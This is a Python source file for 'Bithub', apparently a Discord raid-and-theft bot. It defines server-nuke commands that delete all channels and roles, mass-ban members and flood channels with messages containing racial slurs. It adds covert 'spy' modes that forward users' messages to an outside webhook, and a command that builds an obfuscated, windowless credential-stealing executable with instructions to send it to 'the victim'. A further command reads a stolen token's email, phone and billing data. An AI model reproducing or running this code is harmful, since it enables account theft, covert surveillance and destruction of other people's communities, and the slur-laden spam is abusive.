import discord
import datetime
import aiohttp
import asyncio
import requests
import time
import random
import os
import base64
import marshal
import string
import socket
import subprocess
import threading
import praw
from config import TOKEN
from utils.tokeninfo import tokeninfo
from utils.shitlist import en, zh, ru, allat
from utils.housechanger import hypesquadchanger
from utils.userfunctions import remove_friends, block_friends, settings, dms_close, mass_dm, delete_servers
from discord.ext import commands
from discord.ui import Select




# ================                Bithub v0.02              ================ # 
# ++++++++++++++++               S. 10/17/2023              ++++++++++++++++ #


                # ================ changelog ================ #
                # added more user token functions
                # quick improvements on nuke functions            newer
                # fixed massban
                # add sum goofy shit                               🔽
                # made help look better                           older
                # added convert token grabber file to exe option
                # added ip info                
                # added github profile info 
                # everything looks better now
                # added message spy with full webhook support
                # added tokeninformation
                # flush will now delete channels before spamming
                # added tokeninfo.py
                # added token grabber generator
                # added grabber.py
                # ================ changelog ================ # 




                # ================ to do list ================ # 
                # fix profile spy
                # add badges to token info,skid from https://github.com/Fadi002/Discord-Token-Info/blob/main/src/info.py
                # turn everything to slash cmd
                # turn everything to embeds
                # ================ to do list ================ # 





YOURUSERID = '992952207588720730'
DMONREADY = "FALSE"


intents = discord.Intents.all()


bot = commands.Bot(command_prefix="!", intents=intents)


bot.remove_command('help')

reddit = praw.Reddit(client_id='',
                     client_secret='',
                     user_agent='XOLOGANG111')



@bot.event
async def on_ready():
    global DMONREADY
    user = await bot.fetch_user(YOURUSERID)
    await bot.change_presence(status=discord.Status.online)
    activity = discord.Activity(type=discord.ActivityType.listening, name=f"{bot.command_prefix}help")
    await bot.change_presence(activity=activity)
    if DMONREADY != "FALSE":
        embexd = discord.Embed(description='<:glory:1168889710438010950>  Bot initiated.  |  Developed by xolo', color=discord.Color.gold())
        await user.send(embed=embexd)
        embezd = discord.Embed(description='<:github:1168890688943968256>  [Github](https://github.com/x9o/Bithub)', color=discord.Color.darker_grey())
        await user.send(embed=embezd)
    print(f'Logged in as {bot.user.name}')
    



@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        embxdd = discord.Embed(title="❌ Invalid Command", description=f"Try '{bot.command_prefix}help'.", color=discord.Color.red())
        await ctx.reply(embed=embxdd)


# goofy spy #
# ========================================================================= #
fuckingwebhook = None
messagespy = "OFF"
auditlogspy = "OFF"
userprofilespy = "OFF"
banspy = "OFF"
deletespy = "OFF"
leavespy = "OFF"
editspy = "OFF"





@bot.event
async def on_message(message):
    await bot.process_commands(message)
    global fuckingwebhook
    global messagespy

    if messagespy != "OFF":
        if message.channel.name == "spy":
            return

        embed = discord.Embed(
            title='👁️ Message detected',
            description='',
            color=discord.Color.dark_purple()
        )

         
        current_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        embed.add_field(name='📃 Content', value=f"{message.content}", inline=True)
        embed.add_field(name='✒️ Author', value=f"@{message.author}", inline=True)
        embed.add_field(name='🔗 Channel', value=f"#{message.channel.name}", inline=True)
        embed.add_field(name='🏫 Server', value=message.guild.name, inline=True)
        embed.add_field(name='🆔 Message ID', value=message.id, inline=True)
        embed.add_field(name='📅 Date [Y-M-D]', value=current_date, inline=True)

        # Check if the message is replying to another message   
        if message.reference and message.reference.message_id:
            replied_message = await message.channel.fetch_message(message.reference.message_id)
            if replied_message:
                embed.add_field(name='↩️ Replying to', value=f'"{replied_message.content}" — @{replied_message.author}', inline=True)
            else:
                embed.add_field(name='↩️ Replying to', value='Message not found', inline=True)
        else:
            embed.add_field(name='↩️ Replying to', value='None', inline=True)


       
        embed.set_footer(text="🐈‍⬛ signed by xolo")

        payload = {
            'embeds': [embed.to_dict()]
        }

        # Send payload to the webhook
        async with aiohttp.ClientSession() as session:
            async with session.post(fuckingwebhook, json=payload):
                pass
        

@bot.event
async def on_audit_log_entry_create(entry):
    global auditlogspy

    if auditlogspy != "OFF":
        guild = entry.guild
        channel = discord.utils.get(guild.text_channels, name='spy')

        actionxd = str(entry.action).replace("AuditLogAction.", "")

        embed = discord.Embed(title='👁️ Audit Log Entry Created', color=discord.Color.green())
        embed.add_field(name='👊 Action', value=actionxd, inline=True)
        embed.add_field(name='🪪 User', value=f"@{str(entry.user)}", inline=True)
        embed.add_field(name='🎯 Target', value=str(entry.target), inline=True)
        embed.add_field(name='❓ Reason', value=str(entry.reason), inline=True)
        embed.set_footer(text="Audit log spy is limited to this current server. ")

        await channel.send(embed=embed)






@bot.event
async def on_member_update(before, after):
    global userprofilespy

    if userprofilespy != "OFF":
        guild = after.guild
        channel = discord.utils.get(guild.text_channels, name='spy')

        userbefore = before.name
        userafter = after.name

        

        avbefore = before.avatar.url if before.avatar else None
        avafter = after.avatar.url if after.avatar else None

        beforedis = before.display_name
        afterdis = after.display_name

        embed = discord.Embed(title="👁️ Profile change detected", description="Profile change detected.", color=discord.Color.dark_green())
        embed.add_field(name="⬅️ Username before:", value=f"{userbefore}", inline=True)
        embed.add_field(name="➡️ Username after:", value=f"{userafter}", inline=True)
        embed.add_field(name="⬅️ Display name before:", value=f"{beforedis}", inline=True)
        embed.add_field(name="➡️ Display name after:", value=f"{afterdis}", inline=True)

        
        embedtwo = discord.Embed(title="⬅️ Avatar before:", description="", color=discord.Color.dark_green())
        embedtwo.set_image(url=avbefore)

        embedthree = discord.Embed(title="➡️ Avatar after:", description="", color=discord.Color.dark_green())
        embedthree.set_image(url=avafter)

        await channel.send(embed=embed)
        await channel.send(embed=embedtwo)
        await channel.send(embed=embedthree)
        
@bot.event
async def on_member_ban(guild, user):
    channel = discord.utils.get(guild.text_channels, name='spy')
    global banspy

    if banspy != "OFF":
        avatar_url = user.avatar.url if user.avatar else user.default_avatar.url
        embed = discord.Embed(title="👁️ User banned", description=f"**{user}** was banned in {guild}.", color=discord.Color.red())
        embed.set_image(url=f"{avatar_url}")
        await channel.send(embed=embed)

@bot.event
async def on_member_remove(member):
    guild = member.guild
    channel = discord.utils.get(guild.text_channels, name='spy')
    global leavespy

    if leavespy != "OFF":
        embed = discord.Embed(title="👁️ User left", description=f"@**{member}** left {guild}.", color=discord.Color.dark_gray())
        await channel.send(embed=embed)
    
@bot.event
async def on_message_delete(message):
    guild = message.guild
    content = message.content
    author = message.author
    channelx = message.channel
    channel = discord.utils.get(guild.text_channels, name='spy')
    global deletespy

    if deletespy != "OFF":
        embed = discord.Embed(title="👁️ Message deleted", description="", color=discord.Color.dark_teal())
        embed.add_field(name="📜 Message content:", value=f"**{content}**", inline=True)
        embed.add_field(name="✒️ Message author:", value=f"@{author}", inline=True)
        embed.add_field(name="🔗 Channel where message was deleted: ", value=f"#{channelx}", inline=True)
        embed.set_footer(text="Delete spy is limited to this current server. ")
        

        await channel.send(embed=embed)

@bot.event
async def on_message_edit(before, after):
    befx = before.content
    aftx = after.content
    guild = after.guild
    author = after.author
    channelz = after.channel
    channel = discord.utils.get(guild.text_channels, name='spy')
    global editspy
    
    if editspy != "OFF":
        embed = discord.Embed(title="Message edited", description="", color=discord.Color.light_gray())
        embed.add_field(name="◀️ Before: ", value=f"{befx}", inline=False)
        embed.add_field(name="▶️ After: ", value=f"{aftx}", inline=False)
        embed.add_field(name="🔗 Channel: ", value=f"#{channelz}", inline=False)
        embed.add_field(name="✒️ Message author: ", value=f"@{author}", inline=False)
        embed.set_footer(text="Edit spy is limited to this current server. ")

        await channel.send(embed=embed)

@bot.command()
async def messagespytoggle(ctx, mode: str, webhk=""):
    global messagespy
    global fuckingwebhook
    if mode.lower() == "on":
        if not webhk.startswith("https://discord.com/api/webhooks/") or webhk == "":
            await ctx.reply("Invalid webhook.")
        else:
            messagespy = "ON"
            await ctx.reply(f"☑️ Message spy enabled. Webhook: ||{webhk}||")
            fuckingwebhook = webhk
            guild = ctx.guild
            overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True)
            }
            existing_channel = discord.utils.get(guild.channels, name="spy")
            if existing_channel is None:
                await guild.create_text_channel("spy", overwrites=overwrites)
            await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        messagespy = "OFF"
        await ctx.reply("Message spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")

    
@bot.command()
async def auditspytoggle(ctx, mode: str):
    global auditlogspy
    if mode.lower() == "on":
        auditlogspy = "ON"
        await ctx.reply("☑️ Audit log spy enabled.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
        await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        auditlogspy = "OFF"
        await ctx.reply("Audit log spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")




@bot.command()
async def profilespytoggle(ctx, mode: str):
    global userprofilespy
    if mode.lower() == "on":
        userprofilespy = "ON"
        await ctx.reply("☑️ Profile spy enabled.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
        await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        userprofilespy = "OFF"
        await ctx.reply("Profile spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")

@bot.command()
async def banspytoggle(ctx, mode: str):
    global banspy
    if mode.lower() == "on":
        banspy = "ON"
        await ctx.reply("☑️ Ban spy enabled.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
        await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        banspy = "OFF"
        await ctx.reply("Ban spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")

@bot.command()
async def leavespytoggle(ctx, mode: str):
    global leavespy
    if mode.lower() == "on":
        leavespy = "ON"
        await ctx.reply("☑️ Member leave spy enabled.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
        await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        leavespy = "OFF"
        await ctx.reply("Member leave spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")


@bot.command()
async def deletespytoggle(ctx, mode: str):
    global deletespy
    if mode.lower() == "on":
        deletespy = "ON"
        await ctx.reply("☑️ Message deletion spy enabled.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
        await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        deletespy = "OFF"
        await ctx.reply("Message deletion spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")

@bot.command()
async def editspytoggle(ctx, mode: str):
    global editspy
    if mode.lower() == "on":
        editspy = "ON"
        await ctx.reply("☑️ Edit spy enabled.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
        await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        editspy = "OFF"
        await ctx.reply("Edit spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")


# goofy spy #
# ========================================================================= #

@bot.command()
async def setprefix(ctx, prefix: str):
    if ctx.author.id != int(YOURUSERID):
        await ctx.reply('You are not authorized to use this command.')
        return
    bot.command_prefix = prefix
    await ctx.send(f"☑️ The bot's prefix has been changed to '{prefix}'")


@bot.command()
async def setstatus(ctx, status: str):
    if ctx.author.id != int(YOURUSERID):
        await ctx.reply('You are not authorized to use this command.')
        return

    if status.lower() == 'online':
        await bot.change_presence(status=discord.Status.online)
        await ctx.reply('☑️ Done.')
    elif status.lower() == 'idle':
        await bot.change_presence(status=discord.Status.idle)
        await ctx.reply('☑️ Done.')
    elif status.lower() == 'dnd' or status.lower() == 'do not disturb':
        await bot.change_presence(status=discord.Status.dnd)
        await ctx.reply('☑️ Done.')
    elif status.lower() == 'invisible':
        await bot.change_presence(status=discord.Status.invisible)
        await ctx.reply('☑️ Done.')
    else:
        embaed = discord.Embed(title="", description=f":x:  Invalid status. Please choose one of the following: online, idle, dnd, invisible.", color=discord.Color.red())
        await ctx.reply(embed=embaed)


@bot.command()
async def flush(ctx, server_id: int = None):
    await ctx.message.delete()
    if server_id is None:
        server_id = ctx.guild.id
    try:
        channel_names = ["NUKED NIGGAS", "get fucked", "RAIDED", "GET SHITTED ON"]
        message_contents = ["@everyone GET NUKED 🤡", "@everyone RAIDED", "@everyone speak your shit lil niggas", "@everyone FLOP"]
        guild = bot.get_guild(int(server_id))
        if guild is not None:
            
            for channel in guild.channels:
                await channel.delete()

            created_channels = []
            channel_amount = 10
            message_amount = 80

            for _ in range(channel_amount):
                new_channel_name = random.choice(channel_names)
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                    guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                }
                new_channel = await guild.create_text_channel(new_channel_name, overwrites=overwrites)
                created_channels.append(new_channel)

            tasks = []
            for channel in created_channels:
                message_content = random.choice(message_contents)
                task = asyncio.create_task(send_messages(channel, message_amount, message_content))
                tasks.append(task)

            await asyncio.gather(*tasks)
    except Exception as e:
        embaed = discord.Embed(title="", description=f":x:  Error: {e}", color=discord.Color.red())
        await ctx.author.send(embed=embaed)





@bot.command()
async def customflush(ctx, server_id, channel_amount, channel_name, message_amount, *, message_content):
    await ctx.message.delete()
    try:
        guild = bot.get_guild(int(server_id))
        if guild is not None:
            created_channels = []
            for _ in range(int(channel_amount)):
                new_channel_name = channel_name.strip()
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                    guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                }
                new_channel = await guild.create_text_channel(new_channel_name, overwrites=overwrites)
                created_channels.append(new_channel)

            tasks = []
            for channel in created_channels:
                task = asyncio.create_task(send_messages(channel, int(message_amount), message_content))
                tasks.append(task)

            await asyncio.gather(*tasks)

            await ctx.author.send("☑️ Operation complete.")
        else:
            embaed = discord.Embed(title="", description=f":x:  Could not find server with ID {server_id}.", color=discord.Color.red())
            await ctx.reply(embed=embaed)

    except ValueError:
        embxdd = discord.Embed(title="", description=":x:  Invalid syntax.", color=discord.Color.red())
        await ctx.reply(embed=embxdd)
        
@bot.command()
async def purge(ctx, server_id: int = None):
    await ctx.message.delete()
    if server_id is None:
        server_id = ctx.guild.id
    servername = bot.get_guild(server_id).name
    try:
        guild = bot.get_guild(int(server_id))
        if guild is not None:
            for channel in guild.channels:
                await channel.delete()
            await ctx.author.send(f"✅ All channels have been deleted in {servername}.")
        else:
            embxdzd = discord.Embed(title="", description=f":x:  Could not find server with ID {server_id}.", color=discord.Color.red())
            await ctx.reply(embed=embxdzd)
    except ValueError:
        embxdd = discord.Embed(title="", description=":x:  Invalid syntax.", color=discord.Color.red())
        await ctx.reply(embed=embxdd)



@bot.command()
async def leave(ctx, server_id: int = None):
    if server_id is None:
        server_id = ctx.guild.id
    guild = bot.get_guild(int(server_id))
    if guild is not None:
        guildname = guild.name
        await guild.leave()
        await ctx.send(f"☑️ Successfully left the server **{guildname}**.")
    else:
        await ctx.send(f"❌ Could not find the server with ID {server_id}.")

@bot.command()
async def link(ctx):

    await ctx.reply("https://discord.com/api/oauth2/authorize?client_id=999232775443984495&permissions=8&scope=bot")



@bot.command()
async def servinfo(ctx):
    guild = ctx.guild

    embed = discord.Embed(title=f"🏫 {guild.name}", color=discord.Color.blue())
    embed.add_field(name="🆔 Server ID", value=guild.id, inline=False)
    embed.add_field(name="👶 Owner", value=f"@{guild.owner}", inline=False)
    embed.add_field(name="🔢 Member Count", value=guild.member_count, inline=False)
    embed.add_field(name="📅 Created At", value=guild.created_at.strftime("%Y-%m-%d %H:%M:%S"), inline=True)

    await ctx.send(embed=embed)




@bot.command()
async def servlist(ctx):
    servers = bot.guilds
    server_list = ""
    for server in servers:
        text_channels = server.text_channels
        if text_channels:
            invite = await text_channels[0].create_invite()
            permissions = server.me.guild_permissions
            if permissions.administrator:
                permission_string = "Yes"
            else:
                permission_string = "No"
            server_info = f"**{server.name}** (ID: {server.id})\nInvite: {invite.url}\nHas Admin: {permission_string}\n================================\n"
            server_list += server_info
    await ctx.send(f"Server list:\n{server_list}")

@bot.command()
async def massping(ctx, server_id: int = None, message_amount: int = 5, *, message_content: str = ""):
    await ctx.message.delete()
    if server_id is None:
        server_id = ctx.guild.id
    guild = bot.get_guild(server_id)
    if guild is None:
        await ctx.send("Invalid server ID.")
        return

    members = guild.members[:50]  # Fetch up to 50 members
    mentions = ' '.join(member.mention for member in members)

    tasks = []
    for channel in guild.text_channels:
        for _ in range(message_amount):
            tasks.append(channel.send(f"{mentions} {message_content}"))

    await asyncio.gather(*tasks)

    

@bot.command()
async def clear(ctx, server_id: int = None):
    if server_id is None:
        server_id = ctx.guild.id
    guild = bot.get_guild(server_id)
    if guild is None:
        await ctx.send("Invalid server ID.")
        return

    def is_bot_message(message):
        return message.author == bot.user

    deleted_count = 0
    for channel in guild.text_channels:
        async for message in channel.history(limit=None):
            if is_bot_message(message):
                await message.delete()
                deleted_count += 1

    await ctx.message.add_reaction("✔️")
    await ctx.send(f"Deleted {deleted_count} message(s) sent by the bot.")


@bot.command()
async def clearchannel(ctx, server_id: int, channel_id: int):
    try:
        guild = bot.get_guild(server_id)
        channel = guild.get_channel(channel_id)

        if not channel:
            await ctx.send(f"Channel with ID {channel_id} not found.")
            return

        await channel.purge()
        await ctx.send(f"All messages in channel **{channel.name}** have been deleted.")
    except:
        pass


@bot.command()
async def rolepurge(ctx, server_id: int = None):
    await ctx.message.delete()
    if server_id is None:
        server_id = ctx.guild.id
    servername = bot.get_guild(server_id).name
    try:
        guild = bot.get_guild(int(server_id))
        if guild is None:
            await ctx.send("Invalid server ID or bot is not a member of the server.")
            return

        roles = guild.roles
        bot_role = guild.get_member(bot.user.id).top_role

        for role in roles:
            if role.name != "@everyone" and role != bot_role:
                await role.delete()
        
        await ctx.author.send(f"✅ All deletable roles have been deleted in {servername}.")
    except discord.errors.Forbidden:
        pass
        await ctx.author.send(f"✅ All deletable roles have been deleted in {servername}.")
    except ValueError:
        await ctx.send("Invalid server ID format.")




    
    
@bot.command()
async def say(ctx, *args):
    message = " ".join(args)
    await ctx.message.delete() 
    await ctx.send(message)

@bot.command()
async def ban(ctx, user_id: int, *, reason="No reason provided."):
    try:
        user = await bot.fetch_user(user_id)
        await user.send(f'You have been banned from {ctx.guild.name}.\nReason: **{reason}**')
        await ctx.guild.ban(user, reason=reason)
        await ctx.reply(f'Successfully banned user with ID: {user_id}.\nReason: **{reason}**')
    
    except discord.NotFound:
        await ctx.reply('User not found/Failed.')

@bot.command()
async def unban(ctx, id: int):
    user = await bot.fetch_user(id)
    try:
        await ctx.guild.unban(user)
        await ctx.reply(f'Unbanned **{user.name}**')
    except:
        await ctx.reply('Failed.')


@bot.command()
async def massban(ctx):
    global TOKEN
    headers = {
        "Authorization":
            f"Bot {TOKEN}"
    }
    await ctx.message.delete()
    serverid = ctx.guild.id

    def mass_ban(i):
        sessions = requests.Session()
        sessions.put(
            f"https://discord.com/api/v9/guilds/{serverid}/bans/{i}",
            headers=headers
        )

    try:
        await ctx.author.send("⚙️ Starting.....")
        for i in range(3):
            for member in list(ctx.guild.members):
                threading.Thread(
                    target=mass_ban,
                    args=(member.id,)
                ).start()
        servername = bot.get_guild(serverid).name
        await ctx.author.send(f"✅ Banned all bannable users in {servername}.")
    except:
        pass

@bot.command()
async def dm(ctx, userid, *, messagecontent):
    user = await bot.fetch_user(userid)
    try:
        await user.send(f"{messagecontent}")
        await ctx.reply("Direct message sent successfully. ✔️")
    except discord.Forbidden:
        await ctx.reply("Unable to send a direct message to the user. 😢")


@bot.command()
async def webhookspam(ctx, webhook, msg):
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        embaed = discord.Embed(title="", description=f":x:  Invalid webhook.", color=discord.Color.red())
        await ctx.reply(embed=embaed)
        return
    else:
        await ctx.reply("Spamming webhook....")
        await ctx.message.add_reaction("✔️")
        webhookfuck(webhook, msg)


@bot.command()
async def webhookdelete(ctx, webhook):
    x = deletewebhook(webhook)
    await ctx.reply(x)


@bot.command()
async def avatar(ctx, user: discord.User):
    avatar_url = user.avatar.url if user.avatar else user.default_avatar.url
    embed = discord.Embed(title=f"{user.name}'s avatar", description="", color=discord.Color.gold())
    embed.set_footer(text="Trash")
    embed.set_image(url=f"{avatar_url}")
    await ctx.reply(embed=embed)



@bot.command()
async def tokengrabber(ctx, webhook, obfus, mode):
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        await ctx.reply("Invalid webhook URL.")
        return

    with open('utils/grabber.py', 'r') as file:
        content = file.read()

    new_content = content.replace('thewebhook', webhook)

    if obfus.lower() == "true":
        new_content = obfuscate(new_content)

    if mode.lower() == "exe":
        await ctx.reply("This make take a while. Please wait patiently.\nNote: The victim does not need to have python to run the file.")
        
        temp_file_path = 'exe/temp_script.py'
        with open(temp_file_path, 'w') as temp_file:
            temp_file.write(new_content)

        
        subprocess.call(['pyinstaller', '--onefile', '--noconsole', temp_file_path])
        file_path = 'dist/temp_script.exe'
    else:
        file_path = 'exe/temp_script.py'
        with open(file_path, 'w') as file:
            file.write(new_content)

    file = discord.File(file_path, filename='grabber.exe' if mode.lower() == "exe" else 'grabber.py')

    await ctx.reply(file=file, content='Rename this and send it to the victim. Py mode will require the victim to have python installed. Exe is probably flagged as a virus.')

    if mode.lower() == "exe":

        if os.path.exists(file_path):
            os.remove(file_path)
        current_directory = os.path.dirname(os.path.abspath(__file__))
        fp = os.path.join(current_directory, "exe", "temp_script.py")
        if os.path.exists(fp):
            os.remove(fp)
    

    

    

    

@bot.command()
async def tokinfo(ctx, token):
    
    
    info = tokeninfo(token)

    try:
        embed = discord.Embed(title="🎠", description=f"||{token}||", color=discord.Color.gold())
        embed.add_field(name="📛 Username", value=info[1], inline=False)
        embed.add_field(name="🆔 User ID", value=info[2], inline=False)
        embed.add_field(name="📱 Phone Number", value=info[4], inline=False)
        embed.add_field(name="✉️ Email Address", value=info[5], inline=False)
        embed.add_field(name="🌐 Locale", value=info[12], inline=False)
        embed.add_field(name="🌍 Language", value=info[6], inline=False)
        embed.add_field(name="📅 Creation Date [Day-Month-Year]", value=info[7], inline=False)
        embed.add_field(name="🚀 Has nitro", value=info[8], inline=False)
        embed.add_field(name="🔒 MFA enabled", value=info[9], inline=False)
        embed.add_field(name="🏳️ Flags", value=info[10], inline=False)
        embed.add_field(name="✅ Verified", value=info[11], inline=False)
        embed.set_footer(text="Avatar URL | Billing info will be sent if any")
        embed.set_image(url=info[3])

        first_message = await ctx.reply(embed=embed)  

        billinginfo = None

        if info is not None and len(info) >= 14:
            bill = info[13]
            if bill is not None:
                data = bill[0]
                billinginfo = discord.Embed(title="Billing Information", color=discord.Color.gold())
                for field_name, field_value in data.items():
                    billinginfo.add_field(name=field_name, value=field_value, inline=False)
                await first_message.reply(embed=billinginfo)  
                
            else:
                await first_message.reply("No billing information available :cry:")  
                
        else:
            pass

    except Exception as e:
        embaed = discord.Embed(title="", description=f":x:  {info}", color=discord.Color.red())
        await ctx.reply(embed=embaed)
        print(e)
    


@bot.command()
async def github(ctx, user):
    response = requests.get(f"https://api.github.com/users/{user}")

    if response.status_code == 200:
        profile_data = response.json()
        name = profile_data['name']
        bio = profile_data['bio']
        followers = profile_data['followers']
        following = profile_data['following']
        avatar_url = profile_data['avatar_url']

        repo_response = requests.get(f"https://api.github.com/users/{user}/repos")

        if repo_response.status_code == 200:
            repo_data = repo_response.json()
            x = user

            helpembed = discord.Embed(title=f'{x}', color=discord.Color.green())
            helpembed.set_thumbnail(url=avatar_url)
            helpembed.add_field(name='📂 Profile', value=f'https://github.com/{x}', inline=False)
            helpembed.add_field(name='🏷️ Name', value=f'{name}', inline=False)
            helpembed.add_field(name='💬 Bio', value=f'{bio}', inline=False)
            helpembed.add_field(name=':baby: Followers', value=f'[{followers}](https://github.com/{x}?tab=followers)', inline=False)
            helpembed.add_field(name='🥸 Following', value=f'[{following}](https://github.com/{x}?tab=following)', inline=False)
            helpembed.add_field(name='📖 Public repositories:', value='', inline=False)
            helpembed.set_footer(text="Github: x9o")

            for repo in repo_data:
                repo_name = repo['name']
                repo_url = repo['html_url']
                stars = repo['stargazers_count']  # Number of stars
                forks = repo['forks_count']  
                helpembed.add_field(name=repo_name, value=f'⭐ Stars: {stars}\n🍴 Forks: {forks}\n{repo_url}', inline=False)

            await ctx.reply(embed=helpembed)
        else:
            await ctx.reply("❌ Failed to retrieve repository information.")
    else:
        await ctx.reply("❌ Failed to retrieve profile information.")


@bot.command()
async def ip(ctx, ip):
    ipx = ipinfo(ip)

    if ipx == "❌ Invalid IP/Error.":
        await ctx.send(ipx)
    else:
        helpembed = discord.Embed(title=f'🎠 {ip}', color=discord.Color.dark_gold())
        helpembed.add_field(name='🌍 Country', value=f'{ipx[0]}', inline=True)
        helpembed.add_field(name='🌆 City', value=f'{ipx[1]}', inline=True)
        helpembed.add_field(name='🌳 Region', value=f'{ipx[11]}', inline=True)
        helpembed.add_field(name='🤐 Zip Code', value=f'{ipx[2]}', inline=True)
        helpembed.add_field(name='🅰️ ASN', value=f'{ipx[10]}', inline=True)
        helpembed.add_field(name=':information_source: ISP', value=f'{ipx[3]}', inline=True)
        helpembed.add_field(name='🕝 Timezone', value=f'{ipx[4]}', inline=True)
        helpembed.add_field(name='📏 Latitude', value=f'{ipx[5]}', inline=True)
        helpembed.add_field(name='📐 Longtitude', value=f'{ipx[6]}', inline=True)
        helpembed.add_field(name='🌐 Geolocation', value=f'{ipx[7]}', inline=True)
        helpembed.add_field(name='🥸 Hostname', value=f'{ipx[8]}', inline=True)
        helpembed.add_field(name='🦾 Proxy', value=f'{ipx[9]}', inline=True)
        helpembed.set_footer(text="Github: x9o")
        
        await ctx.send(embed=helpembed)

      # return country, city, zipcode, isp, callingcode, latitude, longtitude, location, hostname, prox

@bot.command()
async def shitpost(ctx, source="dankmemes"):
    global color_codes
    cc = random.choice(color_codes)
    cc_int = int(cc, 16) 
    subreddit = reddit.subreddit(source)
    posts = subreddit.hot(limit=69)
    random_post = random.choice(list(posts))

    embed = discord.Embed(title=random_post.title, color=cc_int)  
    embed.set_image(url=random_post.url)
    embed.set_footer(text=f"r/{source} | {cc}")

    await ctx.send(embed=embed)

@bot.command()
async def yap(ctx, len=150, lang="en"):
    global en
    global zh
    global ru
    global allat
    if lang == "en":
        rw = random.sample(en, len)
        rwj = ' '.join(rw)
        await ctx.send(rwj)
    elif lang == "zh":
        rwx = random.sample(zh, len)
        rwxj = ' '.join(rwx)
        await ctx.send(rwxj)
    elif lang == "ru":
        rwxzr = random.sample(ru, len)
        rwxjzr = ' '.join(rwxzr)
        await ctx.send(rwxjzr)
    elif lang == "all":
        rwxz = random.sample(allat, len)
        rwxjz = ' '.join(rwxz)
        await ctx.send(rwxjz)
    else:
        await ctx.reply("Invalid language.")



@bot.command()
async def help(ctx):
    helprembed = discord.Embed(title='Bithub V0.2 <:glory:1168889710438010950>', description="", color=discord.Color.gold())
    helprembed.set_footer(text="Started - 10/17/2023")

    select = Select(
        placeholder = "📃 Choose a category",
        options=[
        discord.SelectOption(
            label="Server Nuke", 
            emoji="💣", 
            description=""),
        discord.SelectOption(
            label="User Nuke",
            emoji="🎠", 
            description=""),
        discord.SelectOption(
            label="Utils",
            emoji="🛠️", 
            description=""),
        discord.SelectOption(
            label="Spy",
            emoji="👁️", 
            description=""),
        discord.SelectOption(
            label="Malicious",
            emoji="😈", 
            description=""),
        discord.SelectOption(
            label="Misc",
            emoji="🤠", 
            description=""),
        discord.SelectOption(
            label="Fun",
            emoji="🤡", 
            description=""),
        discord.SelectOption(
            label="Github",
            emoji="🐈‍⬛", 
            description=""),
    ])
    
    
    async def callback(interaction):
        if select.values[0] == "Server Nuke":
            help_embed = discord.Embed(title='Server nuke functions', color=discord.Color.red())
            help_embed.add_field(name='💣 Flush', value=f'Nukes server\n`{bot.command_prefix}flush <serverid>`', inline=False)
            help_embed.add_field(name='🔫 Custom Flush', value=f'Creates channels and messages\n`{bot.command_prefix}customflush <serverid> <channelamount> <channelname> <messageamount> <messagecontent>`\nE.g. `{bot.command_prefix}customflush 1234567890 5 ExampleChannel 10 ExampleMessage`', inline=False)
            help_embed.add_field(name='🗑️ Purge', value=f'Deletes all channels\n`{bot.command_prefix}purge <serverid>`', inline=False)
            help_embed.add_field(name='😡 Mass Ping', value=f'Use if the bot does not have admin.\n`{bot.command_prefix}massping <serverid> <messageamount> <messagecontent>`', inline=False)
            help_embed.add_field(name='🧹 Clear Channel', value=f'Deletes all messages in a channel\n`{bot.command_prefix}clearchannel <serverid> <channelid>`', inline=False)
